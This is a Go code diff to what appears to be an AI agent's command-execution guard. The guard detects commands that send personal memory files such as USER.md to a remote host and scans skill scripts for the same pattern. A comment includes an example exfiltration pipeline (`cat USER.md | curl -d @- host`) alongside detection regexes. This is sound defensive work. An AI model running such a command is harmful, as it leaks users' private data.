@@ -26,9 +26,10 @@ var personalFilePattern = regexp.MustCompile(
 	`(?i)(?:^|[\s'"=@/\\(,:])(?:(?:user|soul|memory)\.md\b|(?:memory|sessions)[/\\])`)
 
 // writtenFilePattern finds where a command writes what it fetches: a personal
-// file there is written, not sent.
+// file there is written, not sent. `tee` counts only as a pipeline stage, with
+// every file it names; anywhere else the word is just an argument.
 var writtenFilePattern = regexp.MustCompile(
-	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+)|\btee\s+(?:-a\s+)?)\s*\S+`)
+	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+|\|\s*tee\b[^|]*`)
 
 // scriptPathPattern finds the script files a command hands to an interpreter.
 var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)
@@ -72,12 +73,13 @@ func remoteDestination(text string) string {
 }
 
 // commandUnits splits a command where one command ends and the next begins:
-// an unquoted `;`, `&&` or `||`, or a new line. A pipeline stays whole, since
-// `cat USER.md | curl -d @- host` sends what the first stage reads.
+// an unquoted `;`, `&&` or `||`, or a new line the shell does not continue
+// with a backslash. A pipeline stays whole, since `cat USER.md | curl -d @- host`
+// sends what the first stage reads.
 func commandUnits(command string) []string {
 	var units []string
 	var unit strings.Builder
-	runes := []rune(command)
+	runes := []rune(lineContinuation.Replace(command))
 	quote := rune(0)
 	cut := func() {
 		units = append(units, unit.String())
@@ -110,6 +112,9 @@ func commandUnits(command string) []string {
 	return units
 }
 
+// lineContinuation joins what the shell runs as one line.
+var lineContinuation = strings.NewReplacer("\\\r\n", " ", "\\\n", " ")
+
 // skillScriptsRun is the text of the skill scripts a command runs, so a skill
 // script that names the files and the address itself is read like the command.
 // Only skills come from someone else: the assistant's own scripts, a cron job
@@ -118,14 +123,13 @@ func (t *ExecTool) skillScriptsRun(command, cwd string) string {
 	if t.workingDir == "" {
 		return ""
 	}
-	skills := filepath.Join(t.workingDir, "skills")
 	var text strings.Builder
 	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
 		path := name
 		if !filepath.IsAbs(path) {
 			path = filepath.Join(cwd, path)
 		}
-		if !insideDir(path, skills) {
+		if !isSkillScript(path, t.workingDir) {
 			continue
 		}
 		if info, err := os.Stat(path); err != nil || !info.Mode().IsRegular() {
@@ -143,15 +147,23 @@ func (t *ExecTool) skillScriptsRun(command, cwd string) string {
 	return text.String()
 }
 
-func insideDir(path, dir string) bool {
+// isSkillScript says whether path, once its links are resolved, is inside the
+// workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
+// links out of the workspace is not read: the refusal names a host, and one
+// from a file the agent cannot read must not leak.
+func isSkillScript(path, workspace string) bool {
 	resolved, err := filepath.EvalSymlinks(path)
 	if err != nil {
 		return false
 	}
-	root, err := filepath.EvalSymlinks(dir)
+	root, err := filepath.EvalSymlinks(workspace)
 	if err != nil {
 		return false
 	}
 	rel, err := filepath.Rel(root, resolved)
-	return err == nil && filepath.IsLocal(rel)
+	if err != nil || !filepath.IsLocal(rel) {
+		return false
+	}
+	parts := strings.Split(filepath.ToSlash(rel), "/")
+	return len(parts) > 1 && parts[0] == "skills" || len(parts) > 3 && parts[0] == "loops" && parts[2] == "skills"
 }
